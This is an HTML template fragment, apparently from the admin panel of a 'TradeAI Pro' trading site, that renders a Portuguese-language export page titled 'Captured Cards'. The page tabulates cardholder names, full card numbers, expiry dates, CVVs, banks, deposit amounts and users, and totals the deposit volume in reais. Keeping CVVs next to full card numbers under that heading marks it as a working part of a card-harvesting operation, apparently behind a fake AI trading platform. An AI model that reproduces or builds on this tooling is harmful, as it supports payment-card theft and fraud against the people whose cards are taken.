  <body>
  <div class="bg-glow"></div>
  <div class="wrap">
    <header>
      <div class="logo">TradeAI Pro · Admin</div>
      <h1>Cartões Capturados</h1>
      <p class="subtitle">Exportado em ${m} · ${f.length} registro${f.length!==1?"s":""}</p>
    </header>
    <div class="stats">
      <div class="stat"><div class="stat-n">${f.length}</div><div class="stat-l">Total</div></div>
      <div class="stat"><div class="stat-n">${f.filter(se=>se.account==="real").length}</div><div class="stat-l">Real</div></div>
      <div class="stat"><div class="stat-n">${f.filter(se=>se.account==="demo").length}</div><div class="stat-l">Demo</div></div>
      <div class="stat"><div class="stat-n">R$ ${f.reduce((se,Se)=>se+(Se.totalDeposited||0),0).toLocaleString("pt-BR",{minimumFractionDigits:2})}</div><div class="stat-l">Volume</div></div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th><th>Titular</th><th>Número</th><th>Validade</th>
            <th>CVV</th><th>Bandeira</th><th>Banco</th><th>Conta</th>
            <th>Depósito</th><th>Total</th><th>Usuário</th><th>Data</th>
          </tr>
        </thead>
        <tbody>${_||'<tr><td colspan="12" class="empty">Nenhum cartão registrado</td></tr>'}</tbody>
      </table>
    </div>
    <footer>TradeAI Pro — Documento gerado offline. Uso interno restrito.</footer>
  </div>
  </body>
